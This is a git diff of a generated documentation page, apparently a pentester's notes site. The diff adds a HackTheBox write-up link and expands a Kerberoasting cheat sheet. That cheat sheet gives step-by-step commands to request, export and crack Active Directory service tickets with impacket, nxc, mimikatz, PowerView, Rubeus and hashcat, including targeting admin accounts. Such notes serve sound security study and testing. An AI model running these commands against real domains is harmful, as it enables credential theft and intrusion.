@@ -1293,6 +1293,78 @@
 
               
             
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    HackTheBox
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_2">
+            <span class="md-nav__icon md-icon"></span>
+            HackTheBox
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%F0%9F%A4%93%20writeups/HackTheBox/OverCertified/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    OverCertified
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
           </ul>
         </nav>
       
@@ -3780,63 +3852,69 @@ Using Rubeus
 </span></code></pre></div>
 <strong>Linux</strong>
 <div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">impacket-GetUserSPNs</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">dcip</span><span class="p">&gt;</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">username</span>
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=certified,DC=htb&quot;</span><span class="w"> </span>-s<span class="w"> </span>sub<span class="w"> </span><span class="s2">&quot;(&amp;(objectClass=user)(servicePrincipalName=*))&quot;</span><span class="w"> </span>-H<span class="w"> </span>ldap://10.129.229.25<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>samaccountname:<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-f<span class="w"> </span><span class="m">2</span><span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot; &quot;</span>
 </span></code></pre></div></p>
 <h2 id="exploit">Exploit</h2>
 <hr />
-<p><strong>From Linux</strong>
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">impacket-GetUserSPNs</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">dcip</span><span class="p">&gt;</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">username</span> <span class="n">-request</span>
+<p>Make sure you're time is synced with remote host
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>sudo<span class="w"> </span>timedatectl<span class="w"> </span>set-ntp<span class="w"> </span>off
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>sudo<span class="w"> </span>rdate<span class="w"> </span>-n<span class="w"> </span>&lt;targetDC&gt;
 </span></code></pre></div>
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">impacket-GetUserSPNs</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">dcip</span><span class="p">&gt;</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">username</span> <span class="n">-request-user</span>
+<strong>From Linux</strong>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">impacket-GetUserSPNs</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">dcip</span><span class="p">&gt;</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">username</span> <span class="n">-request</span>
+</span></code></pre></div>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">impacket-GetUserSPNs</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">dcip</span><span class="p">&gt;</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">username</span> <span class="n">-request-user</span>
 </span></code></pre></div>
 you can also use <code>-outputfile &lt;name&gt;</code>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>nxc ldap &lt;IP&gt; -u &#39;user&#39; -p &#39;&#39; --kerberoasting &lt;OUTFILE&gt;
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>nxc ldap &lt;IP&gt; -u &#39;user&#39; -p &#39;&#39; --kerberoasting &lt;OUTFILE&gt;
 </span></code></pre></div></p>
 <p><strong>Crack hash</strong>
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">hashcat</span> <span class="n">-m</span> <span class="n">13100</span> <span class="n">hash</span><span class="p">.</span><span class="n">txt</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">hashcat</span> <span class="n">-m</span> <span class="n">13100</span> <span class="n">hash</span><span class="p">.</span><span class="n">txt</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span>
 </span></code></pre></div>
 <strong>From Windows</strong>
 - Semi-manual approach </p>
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>setspn.exe<span class="w"> </span>-Q<span class="w"> </span>*/*
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>setspn.exe<span class="w"> </span>-Q<span class="w"> </span>*/*
 </span></code></pre></div>
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>Add-Type<span class="w"> </span>-AssemblyName<span class="w"> </span>System.IdentityModel
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>New-Object<span class="w"> </span>System.IdentityModel.Tokens.KerberosRequestorSecurityToken<span class="w"> </span>-ArgumentList<span class="w"> </span><span class="s2">&quot;MSSQLSvc/DEV-PRE-SQL.domain.local:1433&quot;</span>
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>Add-Type<span class="w"> </span>-AssemblyName<span class="w"> </span>System.IdentityModel
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>New-Object<span class="w"> </span>System.IdentityModel.Tokens.KerberosRequestorSecurityToken<span class="w"> </span>-ArgumentList<span class="w"> </span><span class="s2">&quot;MSSQLSvc/DEV-PRE-SQL.domain.local:1433&quot;</span>
 </span></code></pre></div>
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>mimikatz<span class="w"> </span><span class="c1"># base64 /out:true</span>
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>mimikatz<span class="w"> </span><span class="c1"># kerberos::list /export  </span>
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>mimikatz<span class="w"> </span><span class="c1"># base64 /out:true</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>mimikatz<span class="w"> </span><span class="c1"># kerberos::list /export  </span>
 </span></code></pre></div>
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;base64 blob&gt;&quot;</span><span class="w"> </span><span class="p">|</span><span class="w">  </span>tr<span class="w"> </span>-d<span class="w"> </span><span class="se">\\</span>n<span class="w"> </span>
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;base64 blob&gt;&quot;</span><span class="w"> </span><span class="p">|</span><span class="w">  </span>tr<span class="w"> </span>-d<span class="w"> </span><span class="se">\\</span>n<span class="w"> </span>
 </span></code></pre></div>
-<div class="language-Bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>cat<span class="w"> </span>encoded_file<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>sqldev.kirbi
+<div class="language-Bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>cat<span class="w"> </span>encoded_file<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>sqldev.kirbi
 </span></code></pre></div>
-<div class="language-Python highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="n">python2</span><span class="mf">.7</span> <span class="n">kirbi2john</span><span class="o">.</span><span class="n">py</span> <span class="n">sqldev</span><span class="o">.</span><span class="n">kirbi</span>
+<div class="language-Python highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">python2</span><span class="mf">.7</span> <span class="n">kirbi2john</span><span class="o">.</span><span class="n">py</span> <span class="n">sqldev</span><span class="o">.</span><span class="n">kirbi</span>
 </span></code></pre></div>
 <p>This will create a file called <code>crack_file</code>. We then must modify the file a bit to be able to use Hashcat against the hash.</p>
-<div class="language-Python highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="n">sed</span> <span class="s1">&#39;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*</span><span class="se">\1</span><span class="s1">\*\$</span><span class="se">\2</span><span class="s1">/&#39;</span> <span class="n">crack_file</span> <span class="o">&gt;</span> <span class="n">sqldev_tgs_hashcat</span>
+<div class="language-Python highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="n">sed</span> <span class="s1">&#39;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*</span><span class="se">\1</span><span class="s1">\*\$</span><span class="se">\2</span><span class="s1">/&#39;</span> <span class="n">crack_file</span> <span class="o">&gt;</span> <span class="n">sqldev_tgs_hashcat</span>
 </span></code></pre></div>
 <p>Crack the file</p>
-<div class="language-Python highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">hashcat</span> <span class="o">-</span><span class="n">m</span> <span class="mi">13100</span> <span class="n">sqldev_tgs_hashcat</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> 
+<div class="language-Python highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">hashcat</span> <span class="o">-</span><span class="n">m</span> <span class="mi">13100</span> <span class="n">sqldev_tgs_hashcat</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> 
 </span></code></pre></div>
 <div class="admonition info">
 <p class="admonition-title">note</p>
 <p>If we decide to skip the base64 output with Mimikatz and type <code>mimikatz # kerberos::list /export</code>, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run <code>kirbi2john.py</code> against them directly, skipping the base64 decoding step.</p>
 </div>
 <p><strong>PowerView</strong>
-<div class="language-Python highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="o">.</span>\<span class="n">PowerView</span><span class="o">.</span><span class="n">ps1</span>
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="n">Get</span><span class="o">-</span><span class="n">DomainUser</span> <span class="o">*</span> <span class="o">-</span><span class="n">spn</span> <span class="o">|</span> <span class="n">select</span> <span class="n">samaccountname</span>
+<div class="language-Python highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="o">.</span>\<span class="n">PowerView</span><span class="o">.</span><span class="n">ps1</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="n">Get</span><span class="o">-</span><span class="n">DomainUser</span> <span class="o">*</span> <span class="o">-</span><span class="n">spn</span> <span class="o">|</span> <span class="n">select</span> <span class="n">samaccountname</span>
 </span></code></pre></div>
-<div class="language-Python highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">Get</span><span class="o">-</span><span class="n">DomainUser</span> <span class="o">-</span><span class="n">Identity</span> <span class="n">sqldev</span> <span class="o">|</span> <span class="n">Get</span><span class="o">-</span><span class="n">DomainSPNTicket</span> <span class="o">-</span><span class="n">Format</span> <span class="n">Hashcat</span>
+<div class="language-Python highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="n">Get</span><span class="o">-</span><span class="n">DomainUser</span> <span class="o">-</span><span class="n">Identity</span> <span class="n">sqldev</span> <span class="o">|</span> <span class="n">Get</span><span class="o">-</span><span class="n">DomainSPNTicket</span> <span class="o">-</span><span class="n">Format</span> <span class="n">Hashcat</span>
 </span></code></pre></div>
-<div class="language-Python highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="n">Get</span><span class="o">-</span><span class="n">DomainUser</span> <span class="o">*</span> <span class="o">-</span><span class="n">SPN</span> <span class="o">|</span> <span class="n">Get</span><span class="o">-</span><span class="n">DomainSPNTicket</span> <span class="o">-</span><span class="n">Format</span> <span class="n">Hashcat</span> <span class="o">|</span> <span class="n">Export</span><span class="o">-</span><span class="n">Csv</span> <span class="o">.</span>\<span class="n">ilfreight_tgs</span><span class="o">.</span><span class="n">csv</span> <span class="o">-</span><span class="n">NoTypeInformation</span>
+<div class="language-Python highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="n">Get</span><span class="o">-</span><span class="n">DomainUser</span> <span class="o">*</span> <span class="o">-</span><span class="n">SPN</span> <span class="o">|</span> <span class="n">Get</span><span class="o">-</span><span class="n">DomainSPNTicket</span> <span class="o">-</span><span class="n">Format</span> <span class="n">Hashcat</span> <span class="o">|</span> <span class="n">Export</span><span class="o">-</span><span class="n">Csv</span> <span class="o">.</span>\<span class="n">ilfreight_tgs</span><span class="o">.</span><span class="n">csv</span> <span class="o">-</span><span class="n">NoTypeInformation</span>
 </span></code></pre></div>
 <strong>Rubeus</strong>
 List info about kerberoastable accounts
-<div class="language-Python highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="o">.</span>\<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="o">/</span><span class="n">stats</span>
+<div class="language-Python highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="o">.</span>\<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="o">/</span><span class="n">stats</span>
 </span></code></pre></div>
 target admin acccounts
-<div class="language-Python highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="o">.</span>\<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="o">/</span><span class="n">ldapfilter</span><span class="p">:</span><span class="s1">&#39;admincount=1&#39;</span> <span class="o">/</span><span class="n">nowrap</span>
+<div class="language-Python highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="o">.</span>\<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="o">/</span><span class="n">ldapfilter</span><span class="p">:</span><span class="s1">&#39;admincount=1&#39;</span> <span class="o">/</span><span class="n">nowrap</span>
 </span></code></pre></div>
 use tgt delegation to force RC4 downgrade of tickets. (Doesn't work on &gt;= Win 2019)
-<div class="language-Python highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="o">.</span>\<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="o">/</span><span class="n">tgtdeleg</span> <span class="o">/</span><span class="n">nowrap</span>
+<div class="language-Python highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="o">.</span>\<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="o">/</span><span class="n">tgtdeleg</span> <span class="o">/</span><span class="n">nowrap</span>
 </span></code></pre></div></p>
 
 
